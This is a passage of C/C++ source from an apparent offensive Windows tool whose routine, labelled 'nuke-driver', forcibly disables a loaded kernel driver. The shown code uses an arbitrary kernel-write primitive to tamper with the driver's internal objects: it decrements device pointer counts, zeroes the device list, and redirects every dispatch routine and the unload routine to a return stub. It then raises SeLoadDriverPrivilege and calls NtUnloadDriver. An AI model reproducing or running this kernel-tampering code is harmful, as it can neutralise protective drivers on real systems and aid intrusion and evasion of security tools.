                if (ptrCount > 1) {
                    g_drv->Wr64(objHeader, ptrCount - 1);
                    printf("    [+] DevObj[%d] 0x%016llX: PointerCount %lld → %lld\n",
                           d, (unsigned long long)devObj,
                           (long long)ptrCount, (long long)(ptrCount - 1));
                }

                devObj = nextDev;
            }

            // Zero the DriverObject->DeviceObject head
            g_drv->Wr64(drvObjVA + 0x08, 0);
            printf("    [+] Zeroed DeviceObject head (%d device(s) cleaned)\n", devCount);
            cleaned += devCount;
        } else {
            printf("    (no DeviceObjects)\n");
        }
    }

    // ── Step 4: Redirect MajorFunction table to ret stub ─────────────────
    printf("[4] Redirecting MajorFunction[0..27] to ret stub...\n");
    DWORD64 retStub = FindRetStub();
    {
        if (retStub) {
            for (int i = 0; i < 28; i++)
                g_drv->Wr64(drvObjVA + 0x70 + (DWORD64)i * 8, retStub);
            printf("    [+] All 28 MajorFunction slots → ret stub (0x%016llX)\n",
                   (unsigned long long)retStub);
        } else {
            printf("    [!] ret stub not found — skipping MajorFunction redirect\n");
        }
    }

    // ── Step 5: Set DriverUnload to ret stub ─────────────────────────────
    printf("[5] Setting DriverUnload to ret stub...\n");
    if (retStub) {
        g_drv->Wr64(drvObjVA + 0x68, retStub);
        printf("    [+] DriverUnload → ret stub (0x%016llX)\n", (unsigned long long)retStub);
    } else {
        printf("    [!] ret stub not found — cannot set DriverUnload\n");
    }

    // ── Step 6: NtUnloadDriver ───────────────────────────────────────────
    printf("[6] Calling NtUnloadDriver(\"%s\")...\n", svcName);
    {
        typedef NTSTATUS (NTAPI* PFN_RtlAdjustPrivilege)(ULONG, BOOLEAN, BOOLEAN, PBOOLEAN);
        auto RtlAdj = (PFN_RtlAdjustPrivilege)GetProcAddress(
            GetModuleHandleW(L"ntdll.dll"), "RtlAdjustPrivilege");
        if (RtlAdj) {
            BOOLEAN prev;
            RtlAdj(10, TRUE, FALSE, &prev); // SeLoadDriverPrivilege
        }

        typedef NTSTATUS (NTAPI* PFN_NtUnloadDriver)(PUNICODE_STRING);
        auto NtUnload = (PFN_NtUnloadDriver)GetProcAddress(
            GetModuleHandleW(L"ntdll.dll"), "NtUnloadDriver");
        if (!NtUnload) {
            printf("    [!] NtUnloadDriver not found\n");
        } else {
            WCHAR regPath[512];
            swprintf_s(regPath, L"\\Registry\\Machine\\System\\CurrentControlSet\\Services\\%hs", svcName);
            UNICODE_STRING uPath;
            uPath.Length = (USHORT)(wcslen(regPath) * sizeof(WCHAR));
            uPath.MaximumLength = uPath.Length + sizeof(WCHAR);
            uPath.Buffer = regPath;

            NTSTATUS st = NtUnload(&uPath);
            if (st == 0) {
                printf("    %s[+] NtUnloadDriver succeeded — driver fully unloaded%s\n",
                       A_GREEN, A_RESET);
                printf("    Code pages freed, file lock released, driver can be reloaded.\n");
            } else {
                printf("    %s[!] NtUnloadDriver failed: 0x%08X%s\n", A_YELLOW, (unsigned)st, A_RESET);
                if (st == (NTSTATUS)0xC0000010)
                    printf("    STATUS_INVALID_DEVICE_REQUEST — kernel still refuses.\n"
                           "    Driver is functionally dead (callbacks/devices cleaned) but code pages remain.\n"
                           "    Reboot required to fully release file locks.\n");
                else if (st == (NTSTATUS)0xC0000034)
                    printf("    STATUS_OBJECT_NAME_NOT_FOUND — registry key missing.\n"
                           "    Create it: reg add HKLM\\SYSTEM\\CurrentControlSet\\Services\\%s"
                           " /v Type /t REG_DWORD /d 1 /f\n", svcName);
            }
        }
    }

    // ── Summary ──────────────────────────────────────────────────────────
    wprintf(L"\n%hs[*] nuke-driver complete%hs — cleaned %d registration(s) for %ls.\n\n",
            A_GREEN, A_RESET, cleaned, drvName ? drvName : L"<unknown>");
}
